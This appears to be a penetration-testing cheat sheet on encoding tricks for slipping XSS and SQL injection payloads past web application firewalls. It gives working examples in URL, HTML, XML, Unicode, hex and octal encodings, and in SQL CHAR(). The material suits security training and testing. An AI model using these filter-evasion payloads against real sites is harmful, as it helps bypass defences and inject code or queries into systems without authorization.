# Obfuscating

## <mark style="color:yellow;">URL encoding</mark> <a href="#obfuscation-via-url-encoding" id="obfuscation-via-url-encoding"></a>

Sometimes, WAFs may fail to properly URL decode your input during checks.

\-> Encode the keywords, so `SELECT` becomes `%53%45%4C%45%43%54`.

### <mark style="color:yellow;">Double URL encoding</mark> <a href="#obfuscation-via-double-url-encoding" id="obfuscation-via-double-url-encoding"></a>

Since the WAF decodes the input only once, it may fail to detect the threat. If the back-end server double-decodes it, the payload will be injected successfully.

```
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

### <mark style="color:yellow;">HTML encoding</mark> <a href="#obfuscation-via-html-encoding" id="obfuscation-via-html-encoding"></a>

In certain HTML locations, like element text or attribute values, browsers automatically decode these references when parsing.

Server-side checks for alert() may miss it if you HTML encode characters.

```html
<img src=x onerror="&#x61;lert(1)">
```

When the browser renders the page, it will decode and execute the injected payload.

**Leading zeros**

HTML encode `:` -> `&#58;` = `&#0000000000058;`

`<a href="javascript&#00000000000058;alert(1)">Click me</a>`

## <mark style="color:yellow;">XML encoding</mark>

XML supports character encoding with the same numeric escape sequences as HTML.

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

## <mark style="color:yellow;">Unicode escaping</mark> <a href="#obfuscation-via-unicode-escaping" id="obfuscation-via-unicode-escaping"></a>

Prefix `\u`. Most programming languages, including JavaScript, decode Unicode escapes. To obfuscate client-side payloads, you can use Unicode in strings.&#x20;

For example, if input is passed to eval() as a string and blocked, try escaping a character like this: `eval("\u0061lert(1)")`.&#x20;

This encoding may go undetected until decoded by the browser.

{% hint style="info" %}
**Note**: Inside a string, you can escape characters, but outside a string, escaping some characters, like parentheses, will cause a syntax error.
{% endhint %}

ES6-style Unicode escapes allow optional leading zeros, so some WAFs might be fooled similarly to HTML encodings. For example:

```html
<a href="javascript:\u{00000000061}alert(1)">Click me</a>
```

## <mark style="color:yellow;">Hex escaping</mark> <a href="#obfuscation-via-hex-escaping" id="obfuscation-via-hex-escaping"></a>

Prefixed with `\x`. Like Unicode escapes, these will be decoded client-side if the input is evaluated as a string: `eval("\x61lert")`

{% hint style="info" %}
**Note**: sometimes, you can obfuscate SQL statements using the `0x` prefix. For example, `0x53454c454354` decodes to the `SELECT` keyword.
{% endhint %}

## <mark style="color:yellow;">Octal escaping</mark> <a href="#obfuscation-via-octal-escaping" id="obfuscation-via-octal-escaping"></a>

Prefixed with `\`.

`eval("\141lert(1)")`

## <mark style="color:yellow;">Multiple encodings</mark> <a href="#obfuscation-via-multiple-encodings" id="obfuscation-via-multiple-encodings"></a>

```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```

(HTML) `&bsol;` -> `\`

```html
<a href="javascript:\u0061lert(1)">Click me</a>
```

(Unicode) `\u0061` -> `a`

```html
<a href="javascript:alert(1)">Click me</a>
```

## <mark style="color:yellow;">SQL CHAR() function</mark> <a href="#obfuscation-via-the-sql-char-function" id="obfuscation-via-the-sql-char-function"></a>

`CHAR(83)` = `CHAR(0x53)` = `S`

`SELECT` is blacklisted ->

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```
